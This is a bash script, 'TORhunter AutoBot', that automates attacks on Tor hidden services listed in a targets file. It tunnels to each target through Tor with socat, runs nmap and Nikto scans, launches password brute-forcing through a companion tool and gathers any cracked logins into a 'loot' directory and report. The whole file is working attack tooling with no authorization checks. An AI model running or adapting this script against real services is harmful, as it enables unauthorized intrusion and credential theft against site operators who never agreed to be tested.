#!/bin/bash
# TORhunter AutoBot - Automated Target Scanning and Exploitation
# Automatically executes TORhunter functions on targets from targets.txt
# Version 1.0

# Detect script directory
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
TARGETS_FILE="$SCRIPT_DIR/targets.txt"
LOOT_DIR="$SCRIPT_DIR/loot"
LOG_FILE="$LOOT_DIR/autobot-$(date +%Y%m%d-%H%M%S).log"

# Colors for output
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[1;33m'
COLOR_BLUE='\033[0;34m'
COLOR_CYAN='\033[0;36m'
COLOR_RESET='\033[0m'

# Configuration
ENABLE_PROXY=true
ENABLE_SCAN=true
ENABLE_VULN_SCAN=true
ENABLE_BRUTE_FORCE=true
PROXY_PORT=8000
SCAN_TIMEOUT=300  # 5 minutes per scan
BRUTE_TIMEOUT=600  # 10 minutes per brute force

# Function to log messages
log() {
    local level="$1"
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

# Function to display banner
display_banner() {
    clear
    echo -e "${COLOR_CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           TORhunter AutoBot v1.0                          ║"
    echo "║     Automated Target Scanning and Exploitation            ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${COLOR_RESET}"
    echo ""
    log "INFO" "TORhunter AutoBot started"
}

# Function to check dependencies
check_dependencies() {
    log "INFO" "Checking dependencies..."
    local missing_deps=()
    
    for cmd in tor nmap hydra socat; do
        if ! command -v $cmd &> /dev/null; then
            missing_deps+=($cmd)
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log "ERROR" "Missing dependencies: ${missing_deps[*]}"
        echo -e "${COLOR_RED}Missing dependencies: ${missing_deps[*]}${COLOR_RESET}"
        echo "Run: sudo ./install.sh"
        exit 1
    fi
    
    # Check if Tor is running
    if ! pgrep -x "tor" > /dev/null; then
        log "WARN" "Tor is not running, starting..."
        sudo service tor start
        sleep 3
    fi
    
    log "INFO" "All dependencies satisfied"
}

# Function to load targets from file
load_targets() {
    log "INFO" "Loading targets from $TARGETS_FILE"
    
    if [ ! -f "$TARGETS_FILE" ]; then
        log "ERROR" "Targets file not found: $TARGETS_FILE"
        echo -e "${COLOR_RED}Error: targets.txt not found!${COLOR_RESET}"
        echo "Create the file and add onion addresses (one per line)"
        exit 1
    fi
    
    # Read targets, skip empty lines and comments
    mapfile -t TARGETS < <(grep -v '^#' "$TARGETS_FILE" | grep -v '^<' | grep -v '^$' | grep '\.onion')
    
    if [ ${#TARGETS[@]} -eq 0 ]; then
        log "WARN" "No valid targets found in targets.txt"
        echo -e "${COLOR_YELLOW}Warning: No valid .onion addresses found in targets.txt${COLOR_RESET}"
        echo "Add onion addresses to targets.txt (one per line)"
        exit 1
    fi
    
    log "INFO" "Loaded ${#TARGETS[@]} targets"
    echo -e "${COLOR_GREEN}Found ${#TARGETS[@]} targets to process${COLOR_RESET}"
}

# Function to setup proxy for a target
setup_proxy() {
    local target="$1"
    local port="${2:-80}"
    
    log "INFO" "Setting up proxy for $target:$port"
    
    # Kill any existing socat process on the port
    sudo pkill -f "TCP4-LISTEN:$PROXY_PORT"
    sleep 2
    
    # Start proxy in background
    nohup sudo socat TCP4-LISTEN:$PROXY_PORT,reuseaddr,fork SOCKS4A:127.0.0.1:$target:$port,socksport=9050 > "$LOOT_DIR/proxy-$target.log" 2>&1 &
    local proxy_pid=$!
    
    # Wait for proxy to be ready
    sleep 5
    
    # Verify proxy is running
    if ps -p $proxy_pid > /dev/null; then
        log "INFO" "Proxy established for $target (PID: $proxy_pid)"
        echo "$proxy_pid" > "$LOOT_DIR/proxy-$target.pid"
        return 0
    else
        log "ERROR" "Failed to establish proxy for $target"
        return 1
    fi
}

# Function to stop proxy
stop_proxy() {
    local target="$1"
    
    if [ -f "$LOOT_DIR/proxy-$target.pid" ]; then
        local pid=$(cat "$LOOT_DIR/proxy-$target.pid")
        if ps -p $pid > /dev/null 2>&1; then
            log "INFO" "Stopping proxy for $target (PID: $pid)"
            sudo kill $pid 2>/dev/null
        fi
        rm -f "$LOOT_DIR/proxy-$target.pid"
    fi
    
    # Kill any remaining socat processes
    sudo pkill -f "TCP4-LISTEN:$PROXY_PORT"
}

# Function to scan target with nmap
scan_target() {
    local target="$1"
    
    log "INFO" "Scanning $target with nmap"
    echo -e "${COLOR_BLUE}[*] Scanning $target...${COLOR_RESET}"
    
    # Quick scan through proxy
    timeout $SCAN_TIMEOUT nmap -Pn -sT -p 21,22,23,25,80,110,143,443,445,3306,3389,5900,8000,8080,8443 \
        127.0.0.1 -oX "$LOOT_DIR/nmap-$target.xml" -oN "$LOOT_DIR/nmap-$target.txt" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        log "INFO" "Scan completed for $target"
        
        # Extract open ports
        local open_ports=$(grep 'portid=' "$LOOT_DIR/nmap-$target.xml" | grep 'open' | grep -oP 'portid="\K[0-9]+' | tr '\n' ',' | sed 's/,$//')
        
        if [ -n "$open_ports" ]; then
            log "INFO" "Open ports found on $target: $open_ports"
            echo -e "${COLOR_GREEN}[+] Open ports: $open_ports${COLOR_RESET}"
            return 0
        else
            log "WARN" "No open ports found on $target"
            echo -e "${COLOR_YELLOW}[-] No open ports found${COLOR_RESET}"
            return 1
        fi
    else
        log "ERROR" "Scan failed or timed out for $target"
        return 1
    fi
}

# Function to run vulnerability scan
vuln_scan() {
    local target="$1"
    
    log "INFO" "Running vulnerability scan on $target"
    echo -e "${COLOR_BLUE}[*] Running Nikto scan...${COLOR_RESET}"
    
    # Run nikto
    timeout $SCAN_TIMEOUT nikto -host 127.0.0.1 -port $PROXY_PORT \
        -output "$LOOT_DIR/nikto-$target.txt" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        log "INFO" "Vulnerability scan completed for $target"
        echo -e "${COLOR_GREEN}[+] Vulnerability scan complete${COLOR_RESET}"
        return 0
    else
        log "WARN" "Vulnerability scan failed or timed out for $target"
        return 1
    fi
}

# Function to run brute force
brute_force() {
    local target="$1"
    
    log "INFO" "Running brute force on $target"
    echo -e "${COLOR_BLUE}[*] Running password attacks...${COLOR_RESET}"
    
    # Run bruTOR
    timeout $BRUTE_TIMEOUT "$SCRIPT_DIR/bruTOR" 127.0.0.1 > "$LOOT_DIR/bruteforce-$target.log" 2>&1
    
    if [ $? -eq 0 ]; then
        log "INFO" "Brute force completed for $target"
        
        # Check for successful logins
        local found=$(grep -i "login:" "$LOOT_DIR"/hydra-*-127.0.0.1.txt 2>/dev/null | wc -l)
        if [ $found -gt 0 ]; then
            log "SUCCESS" "Found $found credentials for $target"
            echo -e "${COLOR_GREEN}[+] Found $found credentials!${COLOR_RESET}"
        else
            log "INFO" "No credentials found for $target"
            echo -e "${COLOR_YELLOW}[-] No credentials found${COLOR_RESET}"
        fi
        return 0
    else
        log "WARN" "Brute force failed or timed out for $target"
        return 1
    fi
}

# Function to process a single target
process_target() {
    local target="$1"
    local target_clean=$(echo "$target" | tr -d '/' | tr ':' '-')
    
    echo ""
    echo -e "${COLOR_CYAN}════════════════════════════════════════════════${COLOR_RESET}"
    echo -e "${COLOR_CYAN}Processing: $target${COLOR_RESET}"
    echo -e "${COLOR_CYAN}════════════════════════════════════════════════${COLOR_RESET}"
    
    log "INFO" "Starting processing of $target"
    
    # Step 1: Setup proxy
    if [ "$ENABLE_PROXY" = true ]; then
        if ! setup_proxy "$target" 80; then
            log "ERROR" "Failed to setup proxy for $target, skipping"
            return 1
        fi
    fi
    
    # Step 2: Scan target
    if [ "$ENABLE_SCAN" = true ]; then
        scan_target "$target_clean"
    fi
    
    # Step 3: Vulnerability scan
    if [ "$ENABLE_VULN_SCAN" = true ]; then
        vuln_scan "$target_clean"
    fi
    
    # Step 4: Brute force
    if [ "$ENABLE_BRUTE_FORCE" = true ]; then
        brute_force "$target_clean"
    fi
    
    # Cleanup
    if [ "$ENABLE_PROXY" = true ]; then
        stop_proxy "$target_clean"
    fi
    
    log "INFO" "Completed processing of $target"
    echo -e "${COLOR_GREEN}[✓] Target $target completed${COLOR_RESET}"
    
    return 0
}

# Function to generate report
generate_report() {
    log "INFO" "Generating summary report"
    
    local report_file="$LOOT_DIR/autobot-report-$(date +%Y%m%d-%H%M%S).txt"
    
    {
        echo "TORhunter AutoBot Report"
        echo "========================"
        echo "Date: $(date)"
        echo "Targets Processed: ${#TARGETS[@]}"
        echo ""
        echo "Results Summary:"
        echo "----------------"
        
        # Count findings
        local nmap_files=$(ls "$LOOT_DIR"/nmap-*.xml 2>/dev/null | wc -l)
        local nikto_files=$(ls "$LOOT_DIR"/nikto-*.txt 2>/dev/null | wc -l)
        local hydra_files=$(ls "$LOOT_DIR"/hydra-*.txt 2>/dev/null | wc -l)
        
        echo "Port Scans Completed: $nmap_files"
        echo "Vulnerability Scans: $nikto_files"
        echo "Brute Force Attempts: $hydra_files"
        echo ""
        
        # List targets with open ports
        echo "Targets with Open Ports:"
        echo "------------------------"
        for xml in "$LOOT_DIR"/nmap-*.xml; do
            if [ -f "$xml" ]; then
                local target_name=$(basename "$xml" .xml | sed 's/nmap-//')
                local ports=$(grep 'portid=' "$xml" | grep 'open' | grep -oP 'portid="\K[0-9]+' | tr '\n' ',' | sed 's/,$//')
                if [ -n "$ports" ]; then
                    echo "  $target_name: $ports"
                fi
            fi
        done
        echo ""
        
        # List successful credentials
        echo "Discovered Credentials:"
        echo "----------------------"
        for hydra in "$LOOT_DIR"/hydra-*-127.0.0.1.txt; do
            if [ -f "$hydra" ]; then
                grep -i "login:" "$hydra" 2>/dev/null || echo "  None found"
            fi
        done
        
    } > "$report_file"
    
    log "INFO" "Report generated: $report_file"
    echo ""
    echo -e "${COLOR_GREEN}Report saved to: $report_file${COLOR_RESET}"
    
    # Display summary
    cat "$report_file"
}

# Main execution function
main() {
    display_banner
    
    # Create loot directory if it doesn't exist
    mkdir -p "$LOOT_DIR"
    
    # Check dependencies
    check_dependencies
    
    # Load targets
    load_targets
    
    # Process each target
    local success_count=0
    local fail_count=0
    
    for target in "${TARGETS[@]}"; do
        if process_target "$target"; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        
        # Sleep between targets to avoid rate limiting
        sleep 10
    done
    
    # Generate report
    echo ""
    echo -e "${COLOR_CYAN}════════════════════════════════════════════════${COLOR_RESET}"
    echo -e "${COLOR_CYAN}AutoBot Execution Complete${COLOR_RESET}"
    echo -e "${COLOR_CYAN}════════════════════════════════════════════════${COLOR_RESET}"
    echo ""
    echo -e "${COLOR_GREEN}Successfully processed: $success_count${COLOR_RESET}"
    echo -e "${COLOR_RED}Failed: $fail_count${COLOR_RESET}"
    echo ""
    
    generate_report
    
    log "INFO" "TORhunter AutoBot completed"
    echo ""
    echo -e "${COLOR_YELLOW}Check the loot/ directory for detailed results${COLOR_RESET}"
}

# Run main function
main
